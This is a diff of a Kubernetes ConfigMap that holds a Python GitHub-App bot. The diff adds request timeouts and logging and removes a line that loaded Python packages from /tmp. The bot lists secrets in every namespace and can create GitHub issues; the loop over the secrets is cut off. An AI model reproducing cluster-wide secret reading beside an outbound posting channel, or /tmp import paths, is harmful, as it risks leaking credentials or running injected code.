@@ -5,8 +5,6 @@ metadata:
   namespace: harry-botter
 data:
   harry-botter.py: |
-    import site, sys
-    site.addsitedir(f"/tmp/deps/lib/python{sys.version_info.major}.{sys.version_info.minor}/site-packages")
 
     import os
     import jwt
@@ -41,7 +39,7 @@ data:
             "Accept": "application/vnd.github+json"
         }
         url = f"https://api.github.com/app/installations/{installation_id}/access_tokens"
-        response = requests.post(url, headers=headers)
+        response = requests.post(url, headers=headers, timeout=30)
         response.raise_for_status()
         return response.json()["token"]
 
@@ -63,7 +61,7 @@ data:
             "Accept": "application/vnd.github+json"
         }
         params = {"state": "open"}
-        resp = session.get(url, headers=headers, params=params)
+        resp = session.get(url, headers=headers, params=params, timeout=30)
         resp.raise_for_status()
         for issue in resp.json():
             if issue["title"] == title:
@@ -77,19 +75,33 @@ data:
             "Accept": "application/vnd.github+json"
         }
         payload = {"title": title, "body": body}
-        resp = session.post(url, headers=headers, json=payload)
+        resp = session.post(url, headers=headers, json=payload, timeout=30)
         resp.raise_for_status()
         return resp.json()
 
     def main():
+        print("Loading Kubernetes config...")
         config.load_incluster_config()
         v1 = client.CoreV1Api()
+        
+        print("Testing Kubernetes API access...")
+        try:
+            namespaces = v1.list_namespace()
+            print(f"Successfully listed {len(namespaces.items)} namespaces")
+        except Exception as e:
+            print(f"Failed to list namespaces: {e}")
+            raise
 
+        print("Loading GitHub App private key...")
         private_key = load_private_key()
+        print("Generating GitHub App JWT...")
         jwt_token = generate_jwt(APP_ID, private_key)
+        print("Getting GitHub installation token...")
         gh_token = get_installation_token(jwt_token, INSTALLATION_ID)
         session = requests.Session()
+        session.timeout = 30
 
+        print("Listing secrets from Kubernetes API...")
         secrets = v1.list_secret_for_all_namespaces().items
 
         for secret in secrets:
